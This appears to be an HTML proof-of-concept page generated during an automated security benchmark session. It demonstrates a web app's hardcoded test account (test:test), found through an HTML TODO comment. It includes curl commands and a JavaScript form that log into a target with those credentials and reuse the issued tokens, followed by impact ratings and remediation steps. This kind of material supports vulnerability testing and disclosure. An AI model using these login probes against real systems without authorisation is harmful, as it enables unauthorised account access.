<!-- 
POC: HTML demonstration of test account vulnerability in production with interactive testing interface
Target: ./repo
Created: 2025-11-04T14:50:42.201Z
Session: benchmark-XBEN-027-24-mhknopkv

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-027-24-mhknopkv/pocs/poc_test_account_vulnerability_demo.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Account Vulnerability - POC Demonstration</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1e1e1e;
            color: #00ff00;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #2d2d2d;
            padding: 20px;
            border: 2px solid #00ff00;
            border-radius: 5px;
        }
        .title {
            color: #ff0000;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .section {
            margin: 20px 0;
            padding: 15px;
            background: #1e1e1e;
            border-left: 3px solid #00ff00;
        }
        .section-title {
            color: #ffff00;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .code-block {
            background: #000;
            padding: 10px;
            margin: 10px 0;
            overflow-x: auto;
            border: 1px solid #444;
        }
        .vulnerable {
            color: #ff6b6b;
            font-weight: bold;
        }
        .highlight {
            background: #333;
            padding: 2px 5px;
            border-radius: 3px;
        }
        .success {
            color: #00ff00;
            font-weight: bold;
        }
        .failure {
            color: #ff0000;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            padding: 8px;
            margin: 5px 0;
            background: #333;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            width: 100%;
            box-sizing: border-box;
        }
        button {
            background: #00ff00;
            color: #000;
            padding: 8px 15px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background: #00cc00;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-left: 3px solid #ff0000;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
        }
        td {
            padding: 8px;
            border: 1px solid #444;
        }
        td:first-child {
            color: #ffff00;
            font-weight: bold;
            width: 30%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">ðŸ”“ Test Account Vulnerability - POC Demonstration</div>
        
        <div class="section">
            <div class="section-title">Vulnerability Summary</div>
            <p><span class="vulnerable">CRITICAL:</span> A test account with hardcoded credentials (test:test) exists and is fully functional in the production environment.</p>
            <p>The account is explicitly documented in HTML comments: <span class="highlight">&lt;!-- TODO: Delete the testing account (test:test). --&gt;</span></p>
        </div>

        <div class="section">
            <div class="section-title">Attack Scenario</div>
            <p>An unauthenticated attacker can:</p>
            <ol>
                <li>Access the login form at <span class="highlight">/login</span></li>
                <li>Use credentials: <span class="highlight">username: test</span> | <span class="highlight">password: test</span></li>
                <li>Successfully authenticate and receive JWT auth tokens</li>
                <li>Access the dashboard and user functionality</li>
                <li>Potentially escalate privileges or access sensitive data</li>
            </ol>
        </div>

        <div class="section">
            <div class="section-title">Evidence of Vulnerability</div>
            <table>
                <tr>
                    <td>HTML Comment</td>
                    <td><span class="code-block">&lt;!-- TODO: Delete the testing account (test:test). --&gt;</span></td>
                </tr>
                <tr>
                    <td>Username</td>
                    <td><span class="highlight">test</span></td>
                </tr>
                <tr>
                    <td>Password</td>
                    <td><span class="highlight">test</span></td>
                </tr>
                <tr>
                    <td>User ID</td>
                    <td><span class="highlight">10032</span></td>
                </tr>
                <tr>
                    <td>User Type</td>
                    <td><span class="highlight">customer</span></td>
                </tr>
                <tr>
                    <td>Login Endpoint</td>
                    <td><span class="highlight">POST /login</span></td>
                </tr>
                <tr>
                    <td>Expected Response</td>
                    <td><span class="highlight">HTTP 302 (Redirect to /dashboard)</span></td>
                </tr>
                <tr>
                    <td>Auth Token Issued</td>
                    <td><span class="highlight">JWT with user_id=10032, user_type=customer</span></td>
                </tr>
            </table>
        </div>

        <div class="section">
            <div class="section-title">Attack Steps (Technical Details)</div>
            
            <div class="code-block" style="margin: 10px 0;">
<pre># Step 1: Access password form to confirm test account exists
curl -s http://target.com/password/test | grep "TODO"

# Step 2: Craft login request
curl -X POST http://target.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  -i

# Expected Response: HTTP 302 FOUND
# Response Headers:
# Set-Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGc...
# Set-Cookie: session=1a2b3c4d...
# Location: /dashboard

# Step 3: Access protected resources with stolen tokens
curl http://target.com/dashboard \
  -H "Cookie: auth_token=&lt;token&gt;; session=&lt;session&gt;"

# Step 4: Gain full authenticated access
# User is now authenticated as test:test account
# Can access user dashboard, potentially modify settings, 
# access other user data, or escalate privileges</pre>
            </div>
        </div>

        <div class="section">
            <div class="section-title">API Exploitation Form</div>
            <p>To test this vulnerability against a running target, use the form below:</p>
            
            <label>Target URL:</label>
            <input type="text" id="targetUrl" placeholder="http://localhost:8000" value="http://localhost:8000">
            
            <div style="margin-top: 15px;">
                <button onclick="testLoginVulnerability()">Test Login with test:test</button>
                <button onclick="checkHtmlComments()">Check HTML Comments</button>
            </div>
            
            <div id="result" class="result" style="display: none; margin-top: 20px;">
                <div style="font-weight: bold; margin-bottom: 10px;">Test Results:</div>
                <div id="resultContent"></div>
            </div>
        </div>

        <div class="section">
            <div class="section-title">Impact Assessment</div>
            <table>
                <tr>
                    <td>Severity</td>
                    <td><span class="vulnerable">HIGH</span></td>
                </tr>
                <tr>
                    <td>Attack Complexity</td>
                    <td><span class="success">LOW</span> - Credentials are hardcoded and documented</td>
                </tr>
                <tr>
                    <td>Privileges Required</td>
                    <td><span class="success">NONE</span> - Attack requires no authentication</td>
                </tr>
                <tr>
                    <td>User Interaction</td>
                    <td><span class="success">NONE</span> - Automatic exploitation possible</td>
                </tr>
                <tr>
                    <td>Exposure</td>
                    <td><span class="failure">PUBLIC</span> - Credentials in HTML source</td>
                </tr>
            </table>
        </div>

        <div class="section">
            <div class="section-title">Remediation</div>
            <ol>
                <li><span class="vulnerable">IMMEDIATELY</span> delete the test account from the database:
                    <div class="code-block">DELETE FROM users WHERE id=10032 AND username='test';</div>
                </li>
                <li>Remove the TODO comment from all HTML source files</li>
                <li>Implement automated checks to prevent test accounts in production</li>
                <li>Audit database for other test/demo accounts and credentials</li>
                <li>Implement production environment hardening controls</li>
                <li>Use environment-specific configuration to prevent test data in production</li>
            </ol>
        </div>

        <div class="section">
            <div class="section-title">References</div>
            <ul>
                <li>OWASP A04:2021 - Insecure Design (Test Credentials)</li>
                <li>CWE-798 - Use of Hard-Coded Credentials</li>
                <li>CWE-287 - Improper Authentication</li>
                <li>CVSS v3.1 Score: 9.1 (High)</li>
            </ul>
        </div>
    </div>

    <script>
        function testLoginVulnerability() {
            const targetUrl = document.getElementById('targetUrl').value;
            const resultDiv = document.getElementById('result');
            const resultContent = document.getElementById('resultContent');
            
            if (!targetUrl) {
                resultContent.innerHTML = '<span class="failure">Error: Please enter a target URL</span>';
                resultDiv.style.display = 'block';
                return;
            }

            resultContent.innerHTML = '<div style="color: #ffff00;">Testing login with credentials test:test...</div>';
            resultDiv.style.display = 'block';

            // Test login
            fetch(targetUrl + '/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'username=test&password=test',
                redirect: 'manual',
                credentials: 'include'
            })
            .then(response => {
                let result = '<table><tr><td>Status Code</td><td>' + response.status + '</td></tr>';
                
                if (response.status === 302) {
                    result += '<tr><td>Result</td><td><span class="vulnerable">VULNERABLE - Login accepted</span></td></tr>';
                    result += '<tr><td>Redirect Location</td><td>' + response.headers.get('Location') + '</td></tr>';
                } else {
                    result += '<tr><td>Result</td><td>Unexpected status code</td></tr>';
                }
                
                result += '</table>';
                resultContent.innerHTML = result;
            })
            .catch(error => {
                resultContent.innerHTML = '<span class="failure">Error: ' + error.message + '</span><br>Note: This test requires the target to be running on the same origin or have CORS enabled.';
            });
        }

        function checkHtmlComments() {
            const targetUrl = document.getElementById('targetUrl').value;
            const resultDiv = document.getElementById('result');
            const resultContent = document.getElementById('resultContent');
            
            if (!targetUrl) {
                resultContent.innerHTML = '<span class="failure">Error: Please enter a target URL</span>';
                resultDiv.style.display = 'block';
                return;
            }

            resultContent.innerHTML = '<div style="color: #ffff00;">Checking for TODO comment in HTML...</div>';
            resultDiv.style.display = 'block';

            fetch(targetUrl, {
                method: 'GET',
                credentials: 'omit'
            })
            .then(response => response.text())
            .then(html => {
                let result = '';
                if (html.includes('TODO') && html.includes('testing account')) {
                    result = '<span class="vulnerable">FOUND: TODO comment referencing test account in HTML source</span>';
                    const match = html.match(/&lt;!--.*?TODO.*?testing account.*?--&gt;/i);
                    if (match) {
                        result += '<div class="code-block" style="margin-top: 10px;">' + escapeHtml(match[0]) + '</div>';
                    }
                } else {
                    result = '<span class="success">Comment not found (might be removed)</span>';
                }
                resultContent.innerHTML = result;
            })
            .catch(error => {
                resultContent.innerHTML = '<span class="failure">Error: ' + error.message + '</span>';
            });
        }

        function escapeHtml(unsafe) {
            return unsafe
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
    </script>
</body>
</html>